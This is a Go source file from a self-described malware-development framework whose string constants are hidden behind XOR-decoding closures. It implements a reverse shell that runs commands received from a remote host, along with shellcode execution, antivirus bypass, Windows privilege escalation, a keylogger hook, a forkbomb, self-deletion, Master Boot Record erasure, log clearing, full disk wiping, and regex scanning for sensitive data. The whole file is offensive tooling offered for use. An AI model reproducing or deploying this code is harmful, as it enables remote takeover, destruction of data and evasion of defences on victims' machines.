// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package deepfire

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	goLift "github.com/whiterabb17/goLift"
)

var (
	Red     = color.New(color.FgRed).SprintFunc()
	Green   = color.New(color.FgGreen).SprintFunc()
	Cyan    = color.New(color.FgBlue).SprintFunc()
	Bold    = color.New(color.Bold).SprintFunc()
	Yellow  = color.New(color.FgYellow).SprintFunc()
	Magenta = color.New(color.FgMagenta).SprintFunc()
)

func handleReverse(conn net.Conn) {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, (func() string {
mask := []byte("\x71")
maskedStr := []byte("\x7b")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))).Output()
	if err != nil {
		fmt.Fprintf(conn, (func() string {
mask := []byte("\xe4\xae\xf2")
maskedStr := []byte("\xc1\xdd\xf8")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err)
	}
	fmt.Fprintf(conn, (func() string {
mask := []byte("\xd6\xe9\x2a")
maskedStr := []byte("\xf3\x9a\x20")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), out)
}

func getNTPTime() time.Time {
	type ntp struct {
		FirstByte, A, B, C uint8
		D, E, F            uint32
		G, H               uint64
		ReceiveTime        uint64
		J                  uint64
	}
	sock, _ := net.Dial((func() string {
mask := []byte("\x16\x42\x9e")
maskedStr := []byte("\x63\x26\xee")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x0c\xfc\xa6\x84\x79\xc8\x2a\x23\xb3\x79\x29\xdd\xb5\x76\x19\x4e\xd1\x2a\xae")
maskedStr := []byte("\x79\x8f\x88\xf4\x16\xa7\x46\x0d\xdd\x0d\x59\xf3\xda\x04\x7e\x74\xe0\x18\x9d")
res := make([]byte, 19)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	sock.SetDeadline(time.Now().Add((2 * time.Second)))
	defer sock.Close()
	transmit := new(ntp)
	transmit.FirstByte = 0x1b
	binary.Write(sock, binary.BigEndian, transmit)
	binary.Read(sock, binary.BigEndian, transmit)
	return time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((transmit.ReceiveTime >> 32) * 1000000000)))
}

// func _sleep(seconds int, endSignal chan<- bool) {
// 	time.Sleep(time.Duration(seconds) * time.Second)
// 	endSignal <- true
// }

// PrintGood is used to print output indicating success.
func PrintGood(msg string) {
	dt := time.Now()
	t := dt.Format((func() string {
mask := []byte("\x21\x79\x02\x8e\x90")
maskedStr := []byte("\x10\x4c\x38\xbe\xa4")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	fmt.Printf((func() string {
mask := []byte("\x6f\xc7\xf1\xf0\x64\xd1\x62\x0b\xbd\x5b\x49\x1c\x14\x1c\xe6")
maskedStr := []byte("\x34\xe2\x82\xad\x44\xf4\x11\x2b\x87\x61\x69\x39\x67\x3c\xec")
res := make([]byte, 15)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), Green(t), Green(Bold((func() string {
mask := []byte("\x96\x97\x97")
maskedStr := []byte("\xcd\xbc\xca")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))), msg)
}

// PrintInfo is used to print output containing information.
func PrintInfo(msg string) {
	dt := time.Now()
	t := dt.Format((func() string {
mask := []byte("\x3c\x76\x70\xf4\x3e")
maskedStr := []byte("\x0d\x43\x4a\xc4\x0a")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	fmt.Printf((func() string {
mask := []byte("\xba\x37\x88\xb2\x46\xbf\x22\xe9\xa2\x84\x7a\x3d\xf2\x12\xc9")
maskedStr := []byte("\xe1\x12\xfb\xef\x66\xe4\x08\xb4\x82\xbe\x40\x1d\xd7\x61\xc3")
res := make([]byte, 15)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), t, msg)
}

// PrintError is used to print output indicating failure.
func PrintError(msg string) {
	dt := time.Now()
	t := dt.Format((func() string {
mask := []byte("\xb5\x28\x15\x0a\x31")
maskedStr := []byte("\x84\x1d\x2f\x3a\x05")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	fmt.Printf((func() string {
mask := []byte("\x4e\xfc\x13\x09\x02\x41\x3f\xcc\x8e\x0b\x06\xd1\xa3\x80\x6e")
maskedStr := []byte("\x15\xd9\x60\x54\x22\x64\x4c\xec\xb4\x31\x26\xf4\xd0\xa0\x64")
res := make([]byte, 15)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), Red(t), Red(Bold((func() string {
mask := []byte("\x48\x12\x00")
maskedStr := []byte("\x13\x6a\x5d")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))), msg)
}

func DeepSniff(ifac, interval string,
	collector chan string,
	words []string) error {
	var err error
	return err //deepSniff(ifac, interval, collector, words)
}

// PrintWarning is used to print output indicating potential failure.
func PrintWarning(msg string) {
	dt := time.Now()
	t := dt.Format((func() string {
mask := []byte("\xa7\xd2\x77\xcd\x9d")
maskedStr := []byte("\x96\xe7\x4d\xfd\xa9")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	fmt.Printf((func() string {
mask := []byte("\xb5\x91\x13\x0a\x45\xbb\xe3\xfa\x0f\xc7\x8f\x4f\x4c\x3c\xb3")
maskedStr := []byte("\xee\xb4\x60\x57\x65\x9e\x90\xda\x35\xfd\xaf\x6a\x3f\x1c\xb9")
res := make([]byte, 15)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), Yellow(t), Yellow(Bold((func() string {
mask := []byte("\xc1\xd7\xc8")
maskedStr := []byte("\x9a\xf6\x95")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))), msg)
}

// FileToSlice reads a textfile and returns all lines as an array.
func FileToSlice(file string) []string {
	fil, _ := os.Open(file)
	defer fil.Close()
	var lines []string
	scanner := bufio.NewScanner(fil)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

// Alloc allocates memory without use.
func Alloc(size string) {
	// won't this be immidiatly garbage collected?
	_ = make([]byte, SizeToBytes(size))
}

// GenCpuLoad gives the Cpu work to do by spawning goroutines.
func GenCpuLoad(cores int, interval string, percentage int) {
	runtime.GOMAXPROCS(cores)
	unitHundresOfMicrosecond := 1000
	runMicrosecond := unitHundresOfMicrosecond * percentage
	// sleepMicrosecond := unitHundresOfMicrosecond*100 - runMicrosecond

	for i := 0; i < cores; i++ {
		go func() {
			runtime.LockOSThread()
			for {
				begin := time.Now()
				for {
					if time.Since(begin) > time.Duration(runMicrosecond)*time.Microsecond {
						break
					}
				}
			}
		}()
	}

	t, _ := time.ParseDuration(interval)
	time.Sleep(t * time.Second)
}

// ExitOnError prints a given error and then stops execution of the process.
func ExitOnError(e error) {
	if e != nil {
		PrintError(e.Error())
		os.Exit(0)
	}
}

// Wait uses a human friendly string that indicates how long a system should wait.
func Wait(interval string) {
	period_letter := string(interval[len(interval)-1])
	intr := string(interval[:len(interval)-1])
	i, _ := strconv.ParseInt(intr, 10, 64)

	var x int64

	switch period_letter {
	case (func() string {
mask := []byte("\x92")
maskedStr := []byte("\xe1")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):
		x = i
	case (func() string {
mask := []byte("\xb1")
maskedStr := []byte("\xdc")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):
		x = i * 60
	case (func() string {
mask := []byte("\x32")
maskedStr := []byte("\x5a")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):
		x = i * 3600
	}

	time.Sleep(time.Duration(x) * time.Second)
}

// Forkbomb spawns goroutines in order to crash the machine.
func Forkbomb() {
	for {
		go Forkbomb()
	}
}

func GetPath() (string, error) {
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}
	exPath := filepath.Dir(ex)
	return exPath, err
}

// Remove is used to self delete.
func Remove() {
	os.Remove(os.Args[0])
}

func SysShellExec(shellcode []byte) {
	SyscallExecute(shellcode)
}

func Bypass() {
	BypassAV()
}

func Escalate(path string) string {
	var _err error
	if runtime.GOOS == (func() string {
mask := []byte("\x0b\x07\x21\x27\x60\x0a\xf5")
maskedStr := []byte("\x7c\x6e\x4f\x43\x0f\x7d\x86")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) {
		err := goLift.WEscalate(path)
		_err = err
	}
	return _err.Error()
}

func LogKeys() {
	startLogger(0)
}

// Reverse initiates a reverse shell to a given host:port.
func Reverse(host string, port int) {
	conn, err := net.Dial((func() string {
mask := []byte("\x44\xdb\x90")
maskedStr := []byte("\x30\xb8\xe0")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), host+(func() string {
mask := []byte("\x8c")
maskedStr := []byte("\xb6")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())+strconv.Itoa(port))
	ExitOnError(err)

	for {
		handleReverse(conn)
	}
}

// BannerGrab returns a service banner string from a given port.
func BannerGrab(target string, port int) (string, error) {
	conn, err := net.DialTimeout((func() string {
mask := []byte("\x62\xbb\x20")
maskedStr := []byte("\x16\xd8\x50")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), target+(func() string {
mask := []byte("\xb1")
maskedStr := []byte("\x8b")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())+strconv.Itoa(port), time.Second*10)
	if err != nil {
		return (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err
	}

	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(time.Second * 5))

	n, err := conn.Read(buffer)
	if err != nil {
		return (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err
	}

	banner := buffer[0:n]

	return string(banner), nil
}

// EraseMbr zeroes out the Master Boot Record.
// This is linux only, so should live in `coldfier_linux.go`
func EraseMbr(device string, partition_table bool) error {
	cmd := f((func() string {
mask := []byte("\x84\x3b\xdb\xaf\xdb\x44\x43\x2b\x89\x46\x75\x01\x55\xd7\x70\xdf\xf3\xfe\xf8\x18\xc4\x3c\xd5\xc8\xd8\x32\x4b\xcd\xc0\x96\x38\x8f\xe7\xd6\x48\xb3")
maskedStr := []byte("\xe0\x5f\xfb\xc6\xbd\x79\x6c\x4f\xec\x30\x5a\x7b\x30\xa5\x1f\xff\x9c\x98\xc5\x3d\xb7\x1c\xb7\xbb\xe5\x06\x7f\xfb\xe0\xf5\x57\xfa\x89\xa2\x75\x82")
res := make([]byte, 36)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), device)
	if partition_table {
		cmd = f((func() string {
mask := []byte("\x01\xce\x08\x20\xe4\xbd\x27\x21\x0a\x77\x34\x5a\x50\x74\xd5\x56\xcb\xe2\xcb\x7a\x63\x5f\xe3\x04\x52\x87\xa8\x16\x3d\x78\xe5\xc3\x82\x84\x80\xc9")
maskedStr := []byte("\x65\xaa\x28\x49\x82\x80\x08\x45\x6f\x01\x1b\x20\x35\x06\xba\x76\xa4\x84\xf6\x5f\x10\x7f\x81\x77\x6f\xb2\x99\x24\x1d\x1b\x8a\xb6\xec\xf0\xbd\xf8")
res := make([]byte, 36)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), device)
	}

	_, err := CmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

// ClearLogs removes logfiles within the machine.
func ClearLogs() error {
	return clearLogs()
}

// Wipe deletes all data in the machine.
func Wipe() error {
	return wipe()
}

// CreateUser creates a user with a given username and password.
// TODO

// RegexMatch checks if a string contains valuable information through regex.
func RegexMatch(regex_type, str string) bool {
	regexes := map[string]string{
		(func() string {
mask := []byte("\x67\xd4\x34\xb4")
maskedStr := []byte("\x0a\xb5\x5d\xd8")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):   (func() string {
mask := []byte("\xaf\xef\x9f\x91\x5e\x1b\x8d\xf5\x43\x24\xb4\xda\xd0\xba\xc0\xee\xf1\x94\xa1\xe8\xac\xdb\x84\xb8\xdc\x99\x62\x4b\x19\xd1\xf8\xc5\x48\x7e\xeb\x9f\x82\xff\xe9\xa4\x88\x86\x5c\x28\x60\x0f\xa3\xa7\x0b\x97\xfe\x4c\x99\x17\x08\xb5\x58\x94\x21\xd8\x15\x36\x91\xd3\x62\x1d\x40\x4b\x5d\x3f\xdf\x60\xf2\x42\xdf\x5f\x0e\x89\x98\x99\x59\xd3\x3d\x7e\x61\x48\x34\xa6\xf7\xd5\x71\x21\x1f\x5d\x73\xc4\xcf\x93\x0b\x9c\x62\xd3\xd2\x0f\x53\x68\xfc\x22\x1b\x99\x91\x60\x87\x45\x9c\x56\x41\x66\x1c\x32\x52\xb0\xaa\xa1\x65\xed\x1d\x0f\x3e\x40\x5b\x80")
maskedStr := []byte("\xf1\xb4\xfe\xbc\x24\x5a\xa0\xaf\x73\x09\x8d\xf4\xf1\x99\xe4\xcb\xd7\xb3\x8b\xc3\x83\xe6\xbb\xe6\x83\xf9\x19\x37\x64\xaf\xd5\x98\x63\x3e\xb0\xfe\xaf\x85\xa8\x89\xd2\xb6\x71\x11\x3d\x27\x9c\x9d\x50\xf6\xd3\x36\xd8\x3a\x52\x85\x75\xad\x0c\x85\x6e\x06\xbd\xe5\x53\x60\x1b\x2a\x70\x45\x9e\x4d\xa8\x72\xf2\x66\x53\xa0\xa7\xb1\x66\xe9\x61\x50\x3a\x29\x19\xdc\xb6\xf8\x2b\x11\x32\x64\x2e\xec\xf0\xa9\x50\xfd\x4f\xa9\x93\x22\x09\x58\xd1\x1b\x36\xc4\xea\x50\xab\x73\xad\x2b\x1a\x07\x31\x48\x13\x9d\xf0\x91\x48\xd4\x40\x26\x01\x69\x71\xa4")
res := make([]byte, 132)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xd1\xe8")
maskedStr := []byte("\xb8\x98")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):     (func() string {
mask := []byte("\x6b\x4c\x1a\x7e\xad\xc2\x77\x36\xa5\x02\x01\x21\x98\x92\x1c\x7a\xcb\x68\x3b\x03\xfc\xc9\x67\xf7\x77\x65\xe7\xfa\x5e\xf9\xe5\x92\x2a\x97\x7c\xac\x82\xf5\xee\xad\x81\xf4\xb9\xf0\xf7\xa7\x9c\x91\xc6\x51\x4d\xbc\xb6\xe2\x36\xcd\x85\xa4\xbb\xad\x18\x33\x7d\x9a\xd6\x82\x9a\x26\x52\xde\xc1\xc5\xf3\x46\x6f\xf1\x04\x2a\xdc\xc2\x25\xbf\x31")
maskedStr := []byte("\x43\x7e\x2f\x25\x9d\xef\x42\x6b\xd9\x30\x5a\x11\xb5\xa6\x41\x21\xfb\x45\x02\x5e\x80\x92\x57\xc6\x2a\x5a\xbc\xca\x73\xc0\xb8\xc9\x1a\xba\x45\xf1\xbd\xdc\xc6\xf1\xaf\xdc\x8b\xc5\xac\x97\xb1\xa4\x9b\x2d\x7f\xe7\x86\xcf\x02\x90\xde\x94\x96\x94\x45\x4f\x26\xaa\xe7\xdf\xa5\x7d\x62\xf3\xf8\x98\xa8\x76\x42\xc8\x59\x15\xf5\xeb\x5e\x8c\x4c")
res := make([]byte, 83)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x81\x18\xe5")
maskedStr := []byte("\xec\x79\x86")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):    (func() string {
mask := []byte("\x6f\xad\xe0\x60\x2c\xac\x62\xf2\xd5\x59\xb9\x26\xae\x4d\x67\x86\x7b\x23\xa2\xcb\xac\x63\x06\xb2\xe3\x2f\x73\x59\x64\x79\xac\x74\x15\xf2\x51\x14\xfb\x45\x06\xbb\xf0\x29\x5a\xd2\x90\x6f\x24\xb9\x8f\x06")
maskedStr := []byte("\x31\x85\xbb\x50\x01\x95\x23\xdf\x93\x38\x94\x40\xf3\x36\x55\xfb\x20\x19\x8f\x96\x85\x4c\x65\xdd\x8d\x5b\x12\x30\x0a\x0a\xd7\x41\x68\xda\x0a\x24\xd6\x7c\x47\x96\xb6\x48\x77\xb4\xcd\x14\x16\xc4\xa6\x22")
res := make([]byte, 50)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x54\xae\x56\x33")
maskedStr := []byte("\x30\xcf\x22\x56")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):   (func() string {
mask := []byte("\x3d\x79\x92\x42\x50\xcf\x16\x53\xcb\xc6\x57\x45\x17\xea\x69\x40\xac")
maskedStr := []byte("\x61\x1d\xe9\x76\x2d\xe2\x4a\x37\xb0\xf4\x2a\x68\x4b\x8e\x12\x72\xd1")
res := make([]byte, 17)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xcb\x97\x74\xa0\x8a\x79")
maskedStr := []byte("\xaf\xf8\x19\xc1\xe3\x17")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()): (func() string {
mask := []byte("\x40\xa1\x2e\x63\xca\x61\xcd\x98\x2b\xcf\x55\x3a\xcb\x03\x8d\x5e\x03\xa9\x2d\x3d\xdd\x39\x32\x05\x40\x26\xfc\x73\xd7\xaf\xf8\xc5\x71\x6b\x40\xb5\x32\x8a\xcc\x20\x56\x0b\x1b\x64\xa3\x37\x3a\x54\xd7\x6e\x2b\x16\x8e")
maskedStr := []byte("\x1e\x89\x11\x59\xa2\x15\xb9\xe8\x58\xf0\x6f\x66\xe4\x5f\xa2\x77\x3c\x81\x12\x07\x86\x67\x72\x59\x6f\x7a\x92\x2e\xfc\xef\xd1\xfa\x59\x54\x7a\xc2\x45\xfd\x90\x0e\x7f\x34\x33\x3f\xfd\x0d\x66\x7b\x8b\x00\x76\x3d\xa7")
res := make([]byte, 53)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x92\xe5\xc1\xca\x2b")
maskedStr := []byte("\xe2\x8d\xae\xa4\x4e")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):  (func() string {
mask := []byte("\xe8\x00\x8a\x64\xbf\x5c\x3f\x3f\xf6\x3c\x11\x80\x34\x84\x3e\xe4\x04\x51\x7c\x54\xa0\x07\x59\xd3\x2e\x19\x3e\x1e\xae\x16\x47\x2f\xf5\xf1\x19\xb6\xa1\x36\x2d\xfc\x1b\x86\x13\xe0\xf4\xf9\x68\x57\x9d\x1f\xde\xe5\x12\xd1\x94\x47\xd8\xe5\x2a\xaf\xce\xe0\xb7\x98\xb2\xe1\xee\xa5\x7a\x89\xb4\x06\x8b\x59\xd6\xbf\x69\x56\x4b\xcc\xc0\x04\xa2\xee\x74\xb4\x91\xc9\x69\x8b\x85\x45\xbd\x6a\x29\xe5\x36\x62\xd4\x1a\x78\x98\x0c\xdf\xa0\x85\xba\x47\xc2\x96\xcd\x76\xcd\x5c\x93\xa4\x08\xd0\x96\x39\x5c\xe1\x02\x05\xbf\xd5\x7b\xf8\xd6\xcd\x5d\x30\x6e\xd2\x31\x28\xeb\x5c\x3c\x4a\x95\xf1\x3f\xb6\xa8\xad\xb8\x53\xc8\xed\x3d\x9d\xb4\xc2\x2f")
maskedStr := []byte("\xb6\x28\xb5\x5e\x97\x63\x05\x63\xde\x03\x39\xbf\x0e\xb4\x0e\x98\x58\x7a\x55\x7c\xfb\x36\x74\xe7\x73\x45\x5a\x42\xca\x6a\x1c\x1e\xd8\xc8\x44\xea\xc5\x09\x04\xa0\x32\xb9\x3a\xdf\xaf\xa5\x45\x0b\xb3\x43\xfe\xb9\x4e\x8d\xbb\x1a\xe7\xcc\x15\x87\xe6\xdf\x8d\xc4\x9a\xde\xb2\xc1\x01\xb8\x98\x7b\xd7\x70\xe9\xe4\x35\x7b\x17\xe2\x9c\x24\xfe\xb2\x28\x9b\xcc\xf6\x40\xf0\xb5\x69\xc0\x43\x01\xda\x0c\x39\x88\x37\x24\xb6\x50\xff\xfc\xd9\xe6\x68\x9f\xa9\xe5\x49\xf7\x7f\xef\xc1\x70\xa4\xca\x17\x63\x9d\x67\x7d\xcb\xb0\x15\x8b\xbf\xa2\x33\x4c\x16\xfb\x6a\x74\xc6\x00\x12\x16\xb5\xad\x63\xea\x87\xf0\x87\x7b\x94\x89\x16\xb4\x9d\xfd\x0b")
res := make([]byte, 155)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xe5\x79\x94")
maskedStr := []byte("\x86\x1a\xfa")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):    (func() string {
mask := []byte("\x3f\x15\x38\xbe\xeb\x51\x9b\xb9\x6f\x6f\xf1\x4f\xa6\x7f\xb4\xd0\x1b\xf7\x8a\xf7\xcc\xd8\x36\x17\xd4\x9a\xae\xff\x04\x07\xaa\x86\xc6\x12\x31\x77\x8a\x5b\x15\x0b\xeb\x1c\xa4\xf8\xa2\x12\xd8\x81\xa2\xcf\x94\xa1\xe0\x27\xa2\x59\x82\x61\x85\xec\x8a\xec\x6b\x45\xcd\x86\x1f\xca\x0f\x22\xcf\x6f\x2a\x7e\x0d\x8c\x21\xe2\x8c\xb9\xad\x57\x64\x74\x59\x9a\x31\x7d\x46\x3a\xd3\x15\xea\xe7\x3a\xbc\xbf\xe7\x6a\x36\xf2\x99\x7a\x5f\x09\xb2\x3e\xe5\xd6\x7d\x84\x7a\x62\xb3\xd8\xc3\x84\x42\x40\x59\xbe\x8a\x59\xc7\x35\xd7\xc9\xb2\x6f\xdd\x67\x04\x3b\x20\xdc\x27\x63\x82\x34\x3d\xbc\xe6\x29\x45\x15\x94\xc9\x0c\xfa\xcf\x0f\x35")
maskedStr := []byte("\x61\x3d\x07\x84\xdf\x0a\xab\x94\x56\x32\x8a\x7e\x94\x02\x9c\xef\x21\xac\xba\xda\xf5\x85\x4d\x24\xa9\xb3\x91\x83\x5f\x35\x9f\xdb\x9d\x23\x1c\x40\xd7\x00\x25\x26\xd2\x41\xdf\xc9\x96\x6f\xa4\xb7\x8a\xf0\xae\x91\xd1\x16\xde\x6c\xd9\x51\xa8\xd5\xd7\xb7\x5b\x68\xf4\xdb\x36\x91\x3f\x0f\xf6\x32\x51\x4f\x3f\xf1\x5d\xd1\xd7\x8d\x9a\x0a\x3f\x44\x74\xa3\x6c\x06\x77\x09\xae\x69\xd9\xcf\x05\x86\x8f\xbc\x5a\x1b\xc7\xc4\x06\x04\x3f\x8a\x63\xbe\xe6\x50\xbd\x27\x4b\xe8\xe8\xee\xbd\x1f\x3b\x68\x8f\xf7\x25\xef\x0a\xed\xfb\x83\x5c\xec\x1b\x35\x03\x10\xec\x5b\x50\xb7\x68\x59\xc7\xd5\x54\x6c\x49\xf0\xb2\x3d\xcb\xb2\x26\x11")
res := make([]byte, 152)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x58\x06\x12\x51")
maskedStr := []byte("\x2c\x6f\x7f\x34")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()):   (func() string {
mask := []byte("\x18\xe7\x42\x11\x39\xb3\xb4\xdd\xfe\x3f\xd7\x54\xb0\xf3\x56\x61\x7d\xc4\x09\xa2\x1e\x36\xfa\xfa\x16\x94\x9c\x4f\xfb\xd6\x25\xe8\xcd\x9a\x8e\xfc\x61\xe7\x2e\x94\xd6\xb2\x41\xdd\xb1\xb4\xe5\x03\x1c")
maskedStr := []byte("\x46\xcf\x19\x21\x14\x8a\xe9\xa1\xce\x64\xe7\x79\x89\xae\x2a\x50\x26\xf4\x24\x9b\x43\x4a\xc8\xa1\x26\xb9\xaf\x12\xd2\xec\x0d\xb3\xfd\xb7\xb7\xa1\x1d\xbc\x1e\xb9\xe3\xef\x1a\xed\x9c\x8d\xb8\x2a\x38")
res := make([]byte, 49)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xe6\xcd\x03\x06\x80\x27")
maskedStr := []byte("\x85\xbf\x7a\x76\xf4\x48")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()): (func() string {
mask := []byte("\x9d\x7e\x06\x6d\x29\x42\xae\x44\x8d\xa3\xc9\x85\x03\xf1\x4d\x48\xb6\xc7\xdf\xbf\x87\x7e\x58\xb1\x92\x87\x05\x06\xe1\x6e\x0d\x15\x51\x99\xc5\x6c")
maskedStr := []byte("\xc3\x56\x64\x0e\x18\x3e\xf5\x75\xbe\xfe\xe0\xde\x62\xdc\x37\x09\x9b\x8f\x95\x92\xc9\x2e\x75\xeb\xa2\xaa\x3c\x5b\x9a\x5c\x38\x39\x62\xa0\xb8\x48")
res := make([]byte, 36)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
	}
	r := regexp.MustCompile(regexes[regex_type])
	matches := r.FindAllString(str, -1)

	return len(matches) != 0
}
